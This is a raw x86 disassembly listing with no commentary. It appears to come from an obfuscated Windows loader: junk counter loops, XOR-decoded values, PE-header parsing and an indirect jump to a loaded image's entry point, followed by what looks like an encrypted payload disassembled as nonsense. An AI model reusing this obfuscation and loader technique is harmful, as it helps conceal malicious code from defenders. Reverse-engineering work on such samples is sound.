  41ba5e:	add    DWORD PTR ds:0x429018,0x42a018
  41ba68:	mov    DWORD PTR ds:0x42415e,0xf89c85b5
  41ba72:	or     DWORD PTR ds:0x42b01c,0x42c010
  41ba7c:	push   DWORD PTR [ebp+0x10]
  41ba7f:	push   DWORD PTR [ebp+0xc]
  41ba82:	push   DWORD PTR [ebp+0x8]
  41ba85:	call   0x408413
  41ba8a:	adc    edi,edi
  41ba8c:	mov    ecx,DWORD PTR ds:0x42404e
  41ba92:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ba98:	sbb    esi,0x7064
  41ba9e:	mov    DWORD PTR [ecx],eax
  41baa0:	mov    DWORD PTR [ebp-0x4],ebx
  41baa3:	add    esi,0x7033
  41baa9:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bab0:	and    DWORD PTR ds:0x42d000,0x0
  41baba:	jmp    0x41bace
  41babf:	xor    ecx,ecx
  41bac1:	add    ecx,DWORD PTR ds:0x42d000
  41bac7:	inc    ecx
  41bac8:	mov    DWORD PTR ds:0x42d000,ecx
  41bace:	cmp    DWORD PTR ds:0x42d000,0x1d
  41bad5:	jae    0x41bb24
  41badb:	cmp    DWORD PTR ds:0x42d000,0x9
  41bae2:	jne    0x41bafb
  41bae8:	push   0x42b01c
  41baed:	push   DWORD PTR [ebp-0x1c]
  41baf0:	push   0x424464
  41baf5:	call   DWORD PTR ds:0x42501c
  41bafb:	cmp    DWORD PTR ds:0x42d000,0x8
  41bb02:	jne    0x41bb15
  41bb08:	mov    ecx,DWORD PTR ds:0x42d000
  41bb0e:	inc    ecx
  41bb0f:	mov    DWORD PTR ds:0x42d000,ecx
  41bb15:	jmp    0x41babf
  41bb1a:	mov    DWORD PTR ds:0x42a01c,0x231b
  41bb24:	lea    eax,[ebp-0x28]
  41bb27:	and    DWORD PTR ds:0x42c008,0x0
  41bb31:	mov    edi,DWORD PTR ds:0x42c008
  41bb37:	inc    edi
  41bb38:	mov    DWORD PTR ds:0x42c008,edi
  41bb3e:	cmp    DWORD PTR ds:0x42c008,0x17
  41bb45:	jne    0x41bb59
  41bb4b:	push   0x42a00c
  41bb50:	push   DWORD PTR [ebp-0x18]
  41bb53:	call   DWORD PTR ds:0x425020
  41bb59:	cmp    DWORD PTR ds:0x42c008,0x10
  41bb60:	jb     0x41bb31
  41bb66:	and    DWORD PTR ds:0x42900c,0x0
  41bb70:	jmp    0x41bb84
  41bb75:	xor    ecx,ecx
  41bb77:	or     ecx,DWORD PTR ds:0x42900c
  41bb7d:	inc    ecx
  41bb7e:	mov    DWORD PTR ds:0x42900c,ecx
  41bb84:	cmp    DWORD PTR ds:0x42900c,0x1b
  41bb8b:	jae    0x41bc1f
  41bb91:	cmp    DWORD PTR ds:0x42900c,0x20
  41bb98:	jne    0x41bba7
  41bb9e:	push   DWORD PTR [ebp-0x14]
  41bba1:	call   DWORD PTR ds:0x425028
  41bba7:	jmp    0x41bb75
  41bbac:	mov    DWORD PTR ds:0x42b00c,0x15
  41bbb6:	cmp    DWORD PTR ds:0x42b00c,0x0
  41bbbd:	je     0x41bc1f
  41bbc3:	cmp    DWORD PTR ds:0x42b00c,0x4
  41bbca:	jne    0x41bbf1
  41bbd0:	push   0x6080
  41bbd5:	push   DWORD PTR [ebp-0x20]
  41bbd8:	push   0x42d004
  41bbdd:	push   0x710d
  41bbe2:	push   DWORD PTR [ebp-0x10]
  41bbe5:	push   DWORD PTR [ebp-0x14]
  41bbe8:	push   DWORD PTR [ebp-0x24]
  41bbeb:	call   DWORD PTR ds:0x42502c
  41bbf1:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bbf8:	jne    0x41bc0d
  41bbfe:	xor    edi,edi
  41bc00:	add    edi,DWORD PTR ds:0x42b00c
  41bc06:	dec    edi
  41bc07:	mov    DWORD PTR ds:0x42b00c,edi
  41bc0d:	mov    edi,DWORD PTR ds:0x42b00c
  41bc13:	dec    edi
  41bc14:	mov    DWORD PTR ds:0x42b00c,edi
  41bc1a:	jmp    0x41bbb6
  41bc1f:	mov    DWORD PTR [ebp-0x20],eax
  41bc22:	movzx  ecx,BYTE PTR ds:0x429028
  41bc29:	xor    ecx,DWORD PTR ds:0x42c00c
  41bc2f:	mov    DWORD PTR ds:0x429028,ecx
  41bc35:	lea    eax,[ebp-0x2c]
  41bc38:	and    DWORD PTR ds:0x429004,0x0
  41bc42:	jmp    0x41bc54
  41bc47:	mov    esi,DWORD PTR ds:0x429004
  41bc4d:	inc    esi
  41bc4e:	mov    DWORD PTR ds:0x429004,esi
  41bc54:	cmp    DWORD PTR ds:0x429004,0x1e
  41bc5b:	jae    0x41bcfb
  41bc61:	cmp    DWORD PTR ds:0x429004,0x7
  41bc68:	jne    0x41bc79
  41bc6e:	push   0x5e54
  41bc73:	call   DWORD PTR ds:0x425030
  41bc79:	cmp    DWORD PTR ds:0x429004,0x6
  41bc80:	jne    0x41bc95
  41bc86:	xor    esi,esi
  41bc88:	xor    esi,DWORD PTR ds:0x429004
  41bc8e:	inc    esi
  41bc8f:	mov    DWORD PTR ds:0x429004,esi
  41bc95:	jmp    0x41bc47
  41bc9a:	and    DWORD PTR ds:0x42b00c,0x0
  41bca4:	jmp    0x41bcb6
  41bca9:	mov    esi,DWORD PTR ds:0x42b00c
  41bcaf:	inc    esi
  41bcb0:	mov    DWORD PTR ds:0x42b00c,esi
  41bcb6:	cmp    DWORD PTR ds:0x42b00c,0x12
  41bcbd:	jae    0x41bcfb
  41bcc3:	cmp    DWORD PTR ds:0x42b00c,0xc
  41bcca:	jne    0x41bcdc
  41bcd0:	push   DWORD PTR [ebp-0x10]
  41bcd3:	push   DWORD PTR [ebp-0x28]
  41bcd6:	call   DWORD PTR ds:0x425034
  41bcdc:	cmp    DWORD PTR ds:0x42b00c,0xb
  41bce3:	jne    0x41bcf6
  41bce9:	mov    esi,DWORD PTR ds:0x42b00c
  41bcef:	inc    esi
  41bcf0:	mov    DWORD PTR ds:0x42b00c,esi
  41bcf6:	jmp    0x41bca9
  41bcfb:	mov    DWORD PTR [ebp-0x1c],eax
  41bcfe:	mov    eax,ds:0x42404e
  41bd03:	mov    eax,DWORD PTR [eax+0x1c8]
  41bd09:	mov    eax,DWORD PTR [eax]
  41bd0b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bd0e:	mov    esi,0x7510893
  41bd13:	xor    eax,esi
  41bd15:	mov    edi,0x3272db
  41bd1a:	add    eax,edi
  41bd1c:	mov    DWORD PTR [ecx],eax
  41bd1e:	mov    eax,ds:0x42425e
  41bd23:	cmp    eax,0x301ac8f5
  41bd28:	jne    0x41bd4f
  41bd2e:	mov    eax,DWORD PTR [ebp-0x4]
  41bd31:	mov    ecx,DWORD PTR ds:0x42404e
  41bd37:	mov    ecx,DWORD PTR [ecx+0x198]
  41bd3d:	xor    eax,esi
  41bd3f:	add    eax,edi
  41bd41:	mov    DWORD PTR [ecx],eax
  41bd43:	mov    eax,DWORD PTR [ebp-0x4]
  41bd46:	xor    eax,esi
  41bd48:	add    eax,edi
  41bd4a:	mov    ds:0x42425e,eax
  41bd4f:	mov    eax,ds:0x42404e
  41bd54:	mov    eax,DWORD PTR [eax+0x18c]
  41bd5a:	mov    eax,DWORD PTR [eax]
  41bd5c:	mov    DWORD PTR [ebp-0x30],eax
  41bd5f:	mov    eax,0xf89c85ba
  41bd64:	mov    DWORD PTR [ebp-0x1c],eax
  41bd67:	mov    DWORD PTR [ebp-0x1c],eax
  41bd6a:	mov    DWORD PTR [ebp-0x1c],eax
  41bd6d:	mov    DWORD PTR [ebp-0x1c],ebx
  41bd70:	mov    DWORD PTR [ebp-0x38],eax
  41bd73:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bd7a:	mov    ebx,DWORD PTR [ebp-0x4]
  41bd7d:	mov    ecx,DWORD PTR [ebp-0x8]
  41bd80:	mov    edx,DWORD PTR [ebp-0x8]
  41bd83:	xor    edx,esi
  41bd85:	xor    ecx,esi
  41bd87:	add    ecx,edx
  41bd89:	mov    edx,DWORD PTR [ebp-0x8]
  41bd8c:	xor    ebx,esi
  41bd8e:	xor    edx,esi
  41bd90:	add    ebx,edi
  41bd92:	lea    ecx,[ecx+edx*1+0x975891]
  41bd99:	cmp    ebx,ecx
  41bd9b:	ja     0x41bdfc
  41bda1:	mov    eax,DWORD PTR [ebp-0x8]
  41bda4:	xor    eax,esi
  41bda6:	lea    eax,[eax+ebx*1+0x3272db]
  41bdad:	push   eax
  41bdae:	mov    eax,DWORD PTR [ebp-0x1c]
  41bdb1:	xor    eax,esi
  41bdb3:	lea    eax,[ebp+eax*1+0x3272e3]
  41bdba:	push   eax
  41bdbb:	mov    eax,ds:0x42404e
  41bdc0:	push   DWORD PTR [eax+0x1bc]
  41bdc6:	call   0x40843e
  41bdcb:	mov    eax,DWORD PTR [ebp-0x8]
  41bdce:	xor    eax,esi
  41bdd0:	lea    ebx,[ebx+eax*1+0x3272db]
  41bdd7:	mov    eax,DWORD PTR [ebp-0x8]
  41bdda:	mov    ecx,DWORD PTR [ebp-0x8]
  41bddd:	xor    ecx,esi
  41bddf:	xor    eax,esi
  41bde1:	add    eax,ecx
  41bde3:	mov    ecx,DWORD PTR [ebp-0x8]
  41bde6:	xor    ecx,esi
  41bde8:	lea    eax,[eax+ecx*1+0x975891]
  41bdef:	cmp    ebx,eax
  41bdf1:	jbe    0x41bda1
  41bdf7:	mov    eax,0xf89c85ba
  41bdfc:	mov    ecx,DWORD PTR [ebp+0xc]
  41bdff:	mov    DWORD PTR ds:0x423ed2,ecx
  41be05:	mov    ecx,DWORD PTR [ebp+0x10]
  41be08:	mov    DWORD PTR ds:0x424126,ecx
  41be0e:	mov    ecx,DWORD PTR ds:0x423ed2
  41be14:	mov    edx,DWORD PTR [ebp-0x20]
  41be17:	sub    ecx,edi
  41be19:	xor    ecx,esi
  41be1b:	mov    DWORD PTR [edx],ecx
  41be1d:	mov    edx,DWORD PTR [ebp-0xc]
  41be20:	mov    ecx,0xf89c85b6
  41be25:	cmp    edx,ecx
  41be27:	jne    0x41be52
  41be2d:	lea    eax,[ebp-0x14]
  41be30:	mov    DWORD PTR [ebp-0x24],eax
  41be33:	lea    eax,[ebp+0x4]
  41be36:	mov    DWORD PTR [ebp-0x14],eax
  41be39:	mov    eax,DWORD PTR [ebp-0x14]
  41be3c:	test   eax,eax
  41be3e:	je     0x41bf67
  41be44:	mov    eax,DWORD PTR [ebp-0x10]
  41be47:	mov    eax,DWORD PTR [ebp-0x8]
  41be4a:	lea    eax,[ebp-0x24]
  41be4d:	jmp    0x41bf5e
  41be52:	mov    edx,DWORD PTR [ebp-0x28]
  41be55:	cmp    edx,0xf89c85b5
  41be5b:	je     0x41beb8
  41be61:	mov    edx,DWORD PTR [ebp-0x4]
  41be64:	mov    ebx,DWORD PTR [ebp-0x2c]
  41be67:	xor    edx,esi
  41be69:	add    edx,edi
  41be6b:	cmp    edx,ebx
  41be6d:	je     0x41beb8
  41be73:	mov    eax,ds:0x42404e
  41be78:	mov    eax,DWORD PTR [eax+0x194]
  41be7e:	mov    ecx,DWORD PTR [eax]
  41be80:	mov    eax,DWORD PTR [ecx+0x3c]
  41be83:	push   DWORD PTR ds:0x424126
  41be89:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41be8d:	push   DWORD PTR ds:0x423ed2
  41be93:	add    eax,ecx
  41be95:	mov    ecx,DWORD PTR ds:0x42404e
  41be9b:	mov    ecx,DWORD PTR [ecx+0x194]
  41bea1:	push   DWORD PTR [ecx]
  41bea3:	call   eax
  41bea5:	mov    ecx,DWORD PTR ds:0x42404e
  41beab:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41beb1:	mov    DWORD PTR [ecx],eax
  41beb3:	jmp    0x41bf67
  41beb8:	mov    edx,DWORD PTR [ebp-0x4]
  41bebb:	mov    ebx,DWORD PTR [ebp-0x30]
  41bebe:	xor    edx,esi
  41bec0:	add    edx,edi
  41bec2:	cmp    edx,ebx
  41bec4:	jne    0x41bf1d
  41beca:	mov    edx,DWORD PTR [ebp-0x4]
  41becd:	mov    ebx,DWORD PTR ds:0x42404e
  41bed3:	mov    ebx,DWORD PTR [ebx+0x198]
  41bed9:	xor    edx,esi
  41bedb:	add    edx,edi
  41bedd:	cmp    edx,DWORD PTR [ebx]
  41bedf:	jne    0x41befa
  41bee5:	push   ecx
  41bee6:	mov    ecx,DWORD PTR [ebp-0x4]
  41bee9:	xor    ecx,esi
  41beeb:	add    ecx,edi
  41beed:	push   ecx
  41beee:	push   eax
  41beef:	push   DWORD PTR [ebp-0x8]
  41bef2:	push   DWORD PTR [ebp-0x4]
  41bef5:	call   0x416ab7
  41befa:	push   DWORD PTR [ebp-0x8]
  41befd:	push   DWORD PTR [ebp-0x4]
  41bf00:	call   0x41bf89
  41bf05:	mov    eax,DWORD PTR [ebp-0x4]
  41bf08:	xor    eax,esi
  41bf0a:	add    eax,edi
  41bf0c:	mov    ds:0x4240d2,eax
  41bf11:	mov    eax,DWORD PTR [ebp-0x4]
  41bf14:	xor    eax,esi
  41bf16:	add    eax,edi
  41bf18:	mov    ds:0x4240ca,eax
  41bf1d:	lea    eax,[ebp-0x18]
  41bf20:	mov    DWORD PTR [ebp-0x34],eax
  41bf23:	lea    eax,[ebp+0x4]
  41bf26:	mov    DWORD PTR [ebp-0x18],eax
  41bf29:	mov    eax,DWORD PTR [ebp-0x18]
  41bf2c:	test   eax,eax
  41bf2e:	je     0x41bf67
  41bf34:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  41bf3b:	mov    DWORD PTR [ebp-0x40],0x712ed08
  41bf42:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  41bf49:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  41bf50:	call   0x411f4d
  41bf55:	mov    eax,DWORD PTR [ebp-0x10]
  41bf58:	mov    eax,DWORD PTR [ebp-0x8]
  41bf5b:	lea    eax,[ebp-0x34]
  41bf5e:	push   eax
  41bf5f:	push   DWORD PTR [ebp-0x4]
  41bf62:	call   0x40f9a6
  41bf67:	mov    eax,ds:0x42404e
  41bf6c:	push   0x4
  41bf6e:	add    eax,0x1cc
  41bf73:	push   eax
  41bf74:	lea    eax,[ebp-0x10]
  41bf77:	push   eax
  41bf78:	call   0x40843e
  41bf7d:	mov    eax,DWORD PTR [ebp-0x10]
  41bf80:	mov    eax,DWORD PTR [eax]
  41bf82:	pop    edi
  41bf83:	pop    esi
  41bf84:	pop    ebx
  41bf85:	leave  
  41bf86:	ret    0xc
  41bf89:	push   ebp
  41bf8a:	mov    ebp,esp
  41bf8c:	sub    esp,0x98
  41bf92:	mov    eax,DWORD PTR [ebp+0x8]
  41bf95:	inc    ecx
  41bf96:	push   ebx
  41bf97:	sbb    DWORD PTR ds:0x42a014,edx
  41bf9d:	push   esi
  41bf9e:	add    esi,esi
  41bfa0:	push   edi
  41bfa1:	and    DWORD PTR ds:0x42c014,0x0
  41bfab:	jmp    0x41bfbd
  41bfb0:	mov    edi,DWORD PTR ds:0x42c014
  41bfb6:	inc    edi
  41bfb7:	mov    DWORD PTR ds:0x42c014,edi
  41bfbd:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bfc4:	jae    0x41c01b
  41bfca:	cmp    DWORD PTR ds:0x42c014,0xb
  41bfd1:	jne    0x41bfea
  41bfd7:	push   0x4245a8
  41bfdc:	push   0x42453a
  41bfe1:	push   DWORD PTR [ebp-0x1c]
  41bfe4:	call   DWORD PTR ds:0x42503c
  41bfea:	cmp    DWORD PTR ds:0x42c014,0xa
  41bff1:	jne    0x41c004
  41bff7:	mov    edi,DWORD PTR ds:0x42c014
  41bffd:	inc    edi
  41bffe:	mov    DWORD PTR ds:0x42c014,edi
  41c004:	jmp    0x41bfb0
  41c009:	mov    esi,DWORD PTR ds:0x42c000
  41c00f:	or     esi,DWORD PTR ds:0x42a000
  41c015:	mov    DWORD PTR ds:0x42c000,esi
  41c01b:	mov    esi,0x7510893
  41c020:	xor    eax,esi
  41c022:	mov    edi,DWORD PTR ds:0x423e7e
  41c028:	mov    ecx,DWORD PTR ds:0x423e9a
  41c02e:	sub    edi,ecx
  41c030:	sub    edi,DWORD PTR [edi+ecx*1]
  41c033:	mov    edi,0x3272db
  41c038:	add    eax,edi
  41c03a:	xor    ecx,0x38ef
  41c040:	mov    DWORD PTR [ebp-0x30],eax
  41c043:	mov    eax,ds:0x423ece
  41c048:	mov    DWORD PTR ds:0x429010,0x1f
  41c052:	cmp    DWORD PTR ds:0x429010,0x0
  41c059:	je     0x41c0ad
  41c05f:	cmp    DWORD PTR ds:0x429010,0xf
  41c066:	jne    0x41c081
  41c06c:	push   0x82e0
  41c071:	push   0x7826
  41c076:	push   0x30a6
  41c07b:	call   DWORD PTR ds:0x425040
  41c081:	cmp    DWORD PTR ds:0x429010,0x10
  41c088:	jne    0x41c09b
  41c08e:	mov    ecx,DWORD PTR ds:0x429010
  41c094:	dec    ecx
  41c095:	mov    DWORD PTR ds:0x429010,ecx
  41c09b:	mov    ecx,DWORD PTR ds:0x429010
  41c0a1:	dec    ecx
  41c0a2:	mov    DWORD PTR ds:0x429010,ecx
  41c0a8:	jmp    0x41c052
  41c0ad:	mov    eax,DWORD PTR [eax]
  41c0af:	add    ecx,DWORD PTR ds:0x42a01c
  41c0b5:	jmp    0x41e403
  41c0ba:	icebp  
  41c0bb:	push   ecx
  41c0bc:	inc    edi
  41c0bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0bf:	mov    ds:0x413825ab,eax
  41c0c4:	aaa    
  41c0c5:	and    al,0x21
  41c0c7:	jno    0x41c0cd
  41c0c9:	mov    al,ds:0x6261fd24
  41c0ce:	push   ecx
  41c0cf:	pop    edi
  41c0d0:	bound  esp,QWORD PTR [edx+0x7f]
  41c0d3:	imul   sp,si,0x4a
  41c0d7:	sub    eax,0x39a20682
  41c0dc:	and    bl,dh
  41c0de:	stos   DWORD PTR es:[edi],eax
  41c0df:	imul   esp,DWORD PTR [ebx+ecx*8],0xdcd02ba6
  41c0e6:	pushf  
  41c0e7:	leave  
  41c0e8:	dec    esp
  41c0e9:	pop    ds
  41c0ea:	in     al,dx
  41c0eb:	ror    cl,cl
  41c0ed:	out    dx,al
  41c0ee:	push   0x69
  41c0f0:	mov    ecx,0x87826643
  41c0f5:	and    eax,0x876832c
  41c0fa:	mov    cl,0xbf
  41c0fc:	les    edx,FWORD PTR [esi-0x5b]
  41c0ff:	(bad)  
  41c101:	out    dx,al
  41c102:	sub    DWORD PTR [esi+ebx*2],ebx
  41c105:	(bad)  
  41c107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c108:	jnp    0x41c12a
  41c10a:	or     al,0xaa
  41c10c:	mov    edi,0x4ae20e76
  41c111:	lea    edi,[edi+0x11]
  41c114:	rcr    BYTE PTR [edx-0x6],1
  41c117:	rcl    BYTE PTR [edx+0x4a],cl
  41c11a:	fldl2e 
  41c11c:	or     eax,0x12b9da40
  41c121:	pop    ds
  41c122:	lock push 0x4a44a861
  41c128:	jg     0x41c137
  41c12a:	push   0xffffffe8
  41c12c:	or     al,0xd0
  41c12e:	test   al,0x85
  41c130:	fisttp WORD PTR [ebx-0x1b]
  41c133:	xchg   edx,eax
  41c134:	cmp    dh,BYTE PTR [eax]
  41c136:	leave  
  41c137:	gs aam 0xf7
  41c13a:	js     0x41c0cc
  41c13c:	mov    al,ds:0x49bc889f
  41c141:	cs xchg esp,eax
  41c143:	add    BYTE PTR [esi+eax*4-0x12a3435b],ah
  41c14a:	jmp    0x4479678d
  41c14f:	mov    eax,0x69f7c01e
  41c154:	jmp    0x41c0f5
  41c156:	int    0x8d
  41c158:	sub    BYTE PTR ds:[esi-0x9],bh
  41c15c:	test   al,0x61
  41c15e:	in     eax,dx
  41c15f:	mov    al,ds:0x39ccd012
  41c164:	(bad)  
  41c165:	cmp    ebp,DWORD PTR [edi]
  41c167:	adc    eax,0x508444e3
  41c16c:	jno    0x41c1a1
  41c16e:	out    0x6,eax
  41c170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c171:	stc    
  41c172:	jmp    0x4ec2:0x2f95d91f
  41c179:	ja     0x41c1f6
  41c17b:	scas   eax,DWORD PTR es:[edi]
  41c17c:	and    al,0x35
  41c17e:	mov    esp,0x9d505921
  41c183:	and    BYTE PTR [eax+0x284523b9],0x33
  41c18a:	xlat   BYTE PTR ds:[ebx]
  41c18b:	cdq    
  41c18c:	lea    edi,[eax+esi*1]
  41c18f:	ror    ah,1
  41c191:	stc    
  41c192:	mov    esp,0x3a944106
  41c197:	icebp  
  41c198:	mov    ds:0x8405d44f,al
  41c19d:	icebp  
  41c19e:	pusha  
  41c19f:	ffree  st(5)
  41c1a1:	adc    dl,BYTE PTR [ecx-0x36f86317]
  41c1a7:	jno    0x41c180
  41c1a9:	dec    esp
  41c1aa:	es into 
  41c1ac:	mov    cl,0xaa
  41c1ae:	inc    eax
  41c1af:	push   ds
  41c1b0:	xchg   esi,eax
  41c1b1:	mul    edi
  41c1b3:	fmul   DWORD PTR [edi]
  41c1b5:	popf   
  41c1b6:	push   ebp
  41c1b7:	jmp    0x41c219
  41c1b9:	popa   
  41c1ba:	daa    
  41c1bb:	cli    
  41c1bc:	mov    eax,0xb6a8870c
  41c1c1:	mov    ebp,0xe89979dc
  41c1c6:	jnp    0x41c153
  41c1c8:	dec    esi
  41c1c9:	daa    
  41c1ca:	push   ecx
  41c1cb:	cmp    al,0xec
  41c1cd:	xor    DWORD PTR [ebx-0x1087f66a],esi
  41c1d3:	in     al,0xe4
  41c1d5:	adc    al,0xc9
  41c1d7:	shl    BYTE PTR fs:[ebp+ebx*2+0x61],0x8
  41c1dd:	xchg   esi,eax
  41c1de:	pop    ebx
  41c1df:	sub    eax,ecx
  41c1e1:	into   
  41c1e2:	mov    edi,0xdcb96c1f
  41c1e7:	test   eax,0xf5559781
  41c1ec:	test   DWORD PTR ds:0x6cec636e,esi
  41c1f2:	pop    edi
  41c1f3:	gs retf 0x78ed
  41c1f7:	inc    ebx
  41c1f8:	ss call 0xc4e4:0x768295d
  41c200:	jo     0x41c1fe
  41c202:	sub    DWORD PTR [edx+edi*8-0x47],esp
  41c206:	jge    0x41c1f8
  41c208:	pop    eax
  41c209:	ss int3 
  41c20b:	sbb    eax,0xbd6a81cb
  41c210:	imul   ebx,DWORD PTR [ebx],0x9eb0aded
  41c216:	cmp    al,0x83
  41c218:	fst    DWORD PTR [edx+ebp*1]
  41c21b:	in     eax,dx
  41c21c:	sbb    DWORD PTR [edx-0x5d7f61f5],esi
  41c222:	mov    ecx,0xfbbbe9cf
  41c227:	xchg   edx,eax
  41c228:	lods   al,BYTE PTR ds:[esi]
  41c229:	loope  0x41c248
  41c22b:	ds int 0x35
  41c22e:	in     al,0x82
  41c230:	inc    DWORD PTR [edx-0x35]
  41c233:	idiv   BYTE PTR [ecx+0x31fe525d]
  41c239:	clc    
  41c23a:	add    ecx,DWORD PTR [ecx]
  41c23c:	retf   
  41c23d:	mov    ecx,0x4eaa1fe5
  41c242:	push   ecx
  41c243:	mov    dl,0xa0
  41c245:	retf   
  41c246:	mov    ah,0x36
  41c248:	xor    BYTE PTR [ecx+0x46],bl
  41c24b:	std    
  41c24c:	stos   DWORD PTR es:[edi],eax
  41c24d:	aas    
  41c24e:	jne    0x41c288
  41c250:	int    0x39
  41c252:	dec    edi
  41c253:	fdiv   DWORD PTR [ebx]
  41c255:	adc    ch,BYTE PTR [eax]
  41c257:	mov    esp,0x531063c
  41c25c:	cmp    al,0x9a
  41c25e:	mov    al,0xbb
  41c260:	cmp    cx,WORD PTR [edx+0x4d]
  41c264:	popf   
  41c265:	jge    0x41c1fd
  41c267:	pop    ecx
  41c268:	repz jmp 0x45482883
  41c26e:	dec    esi
  41c26f:	and    al,BYTE PTR [esi+0x75]
  41c272:	sbb    DWORD PTR [edx-0x1b],esi
  41c275:	pop    eax
  41c276:	mov    ds:0xb8c184d1,al
  41c27b:	or     BYTE PTR ds:0x992f228b,bl
  41c281:	add    dl,BYTE PTR [edi+0x1151f16]
  41c287:	pusha  
  41c288:	(bad)  
  41c289:	inc    dh
  41c28b:	mov    ah,0x20
  41c28d:	mov    dh,0xf6
  41c28f:	je     0x41c23d
  41c291:	pop    esi
  41c292:	sbb    cl,BYTE PTR [ebx]
  41c294:	lea    ebp,[ebx-0x9324fdb]
  41c29a:	sbb    dh,BYTE PTR [edx+ecx*8]
  41c29d:	xor    eax,0xa4142969
  41c2a2:	test   DWORD PTR [ebx],edx
  41c2a4:	inc    eax
  41c2a5:	xchg   al,bl
  41c2a7:	inc    esi
  41c2a8:	jl     0x41c2fc
  41c2aa:	(bad)  [ebp+0x256c5b20]
  41c2b0:	scas   eax,DWORD PTR es:[edi]
  41c2b1:	aas    
  41c2b2:	inc    ecx
  41c2b3:	pop    ds
  41c2b4:	sub    BYTE PTR [edx],dh
  41c2b6:	inc    edi
  41c2b7:	or     BYTE PTR [ebx-0x3bde39cf],dh
  41c2bd:	out    0x79,al
  41c2bf:	add    dh,bl
  41c2c1:	jecxz  0x41c2bb
  41c2c3:	sub    dh,ch
  41c2c5:	addr16 in eax,0xd8
  41c2c8:	js     0x41c2fe
  41c2ca:	cli    
  41c2cb:	out    dx,al
  41c2cc:	enter  0x3acc,0xf2
  41c2d0:	(bad)  
  41c2d1:	xor    ebp,DWORD PTR [ecx-0x41]
  41c2d4:	mov    edx,0x957b48a5
  41c2d9:	mov    ch,0x97
  41c2db:	std    
  41c2dc:	into   
  41c2dd:	fmul   DWORD PTR [eax+edi*1-0x287751d9]
  41c2e4:	mov    eax,0x5bb45814
  41c2e9:	xchg   edi,eax
  41c2ea:	dec    esi
  41c2eb:	jbe    0x41c341
  41c2ed:	inc    edi
  41c2ee:	pop    bp
  41c2f0:	(bad)  
  41c2f1:	xchg   eax,ebp
  41c2f3:	xchg   ebx,eax
  41c2f4:	xor    ecx,DWORD PTR [edx-0x74]
  41c2f7:	dec    edx
  41c2f8:	add    edi,edi
  41c2fa:	lea    esp,[edi]
  41c2fc:	dec    esp
  41c2fd:	enter  0x7eda,0xe8
  41c301:	into   
  41c302:	dec    edi
  41c303:	mov    ebx,0x761d115a
  41c308:	mov    ebx,esp
  41c30a:	xor    esi,ebp
  41c30c:	out    dx,al
  41c30d:	rcl    BYTE PTR [esi+0xab53f8f],0xc3
  41c314:	sbb    BYTE PTR [eax+0x4c975cd3],cl
  41c31a:	dec    ecx
  41c31b:	sahf   
  41c31c:	push   eax
  41c31d:	dec    ebp
  41c31e:	sbb    eax,0x42e3322a
  41c323:	ret    
  41c324:	mov    WORD PTR [ebx],ss
  41c326:	fisttp QWORD PTR [eax+0x63]
  41c329:	jmp    FWORD PTR [eax]
  41c32b:	shl    BYTE PTR [esi+ebp*2+0x7e52de5d],cl
  41c332:	fstp   QWORD PTR [esi+0xa]
  41c335:	loope  0x41c2b8
  41c337:	inc    ebp
  41c338:	push   edi
  41c339:	mov    WORD PTR [eax],?
  41c33b:	bound  ebx,QWORD PTR [edx+edi*8]
  41c33e:	retf   0xbced
  41c341:	and    eax,0xbe1db75a
  41c346:	xlat   BYTE PTR ds:[ebx]
  41c347:	aas    
  41c348:	sbb    DWORD PTR [edx+0x66eb92af],esp
  41c34e:	xchg   edi,eax
  41c34f:	js     0x41c2f4
  41c351:	sbb    eax,DWORD PTR [ecx+0x37]
  41c354:	cs inc ebx
  41c356:	dec    esp
  41c357:	dec    ebp
  41c358:	cmp    DWORD PTR ds:0x79fa892,edi
  41c35e:	shr    DWORD PTR [ecx+0xaea3d94],cl
  41c364:	icebp  
  41c365:	das    
  41c366:	push   edi
  41c367:	loope  0x41c37f
  41c369:	jmp    0x41c36a
  41c36b:	test   eax,0x28643c79
  41c370:	call   0x3aff:0xb18ec30c
  41c377:	pop    ebx
  41c378:	add    bl,BYTE PTR [edi-0x5d]
  41c37b:	pop    ebp
  41c37c:	loopne 0x41c329
  41c37e:	test   BYTE PTR [eax],cl
  41c380:	sub    eax,0xf071fca0
  41c385:	(bad)
  41c388:	sub    al,0xcd
  41c38a:	mov    dl,0x1e
  41c38c:	jo     0x41c3d7
  41c38e:	or     BYTE PTR [ebx+0x1],0xf2
  41c392:	mov    esi,0x4314b48b
  41c397:	and    eax,0x6d5df4eb
  41c39c:	mov    al,ds:0x4421530c
  41c3a1:	and    eax,eax
  41c3a3:	pop    ebp
  41c3a4:	int    0xa1
  41c3a6:	je     0x41c3d2
  41c3a8:	mov    esi,0x16b312e9
  41c3ad:	test   BYTE PTR [edi+eax*8+0x27f91d42],al
  41c3b4:	test   eax,0x1ef410
  41c3b9:	push   ecx
  41c3ba:	mov    ebx,0xc4602d24
  41c3bf:	clc    
  41c3c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3c1:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3c3:	into   
  41c3c4:	in     eax,dx
  41c3c5:	int3   
  41c3c6:	sub    BYTE PTR [ebx],dl
  41c3c8:	push   ebx
  41c3c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3ca:	lods   al,BYTE PTR ds:[esi]
  41c3cb:	enter  0xecf0,0xa9
  41c3cf:	mov    es,WORD PTR [edi+0x149f62ee]
  41c3d5:	call   0x9516:0x9dd6b96d
  41c3dc:	pop    ebx
  41c3dd:	das    
  41c3de:	add    BYTE PTR [ebp-0x5999a60c],dl
  41c3e4:	loopne 0x41c44a
  41c3e6:	adc    al,0xab
  41c3e8:	jecxz  0x41c446
  41c3ea:	xor    eax,0xb11ab9de
  41c3ef:	xchg   esi,eax
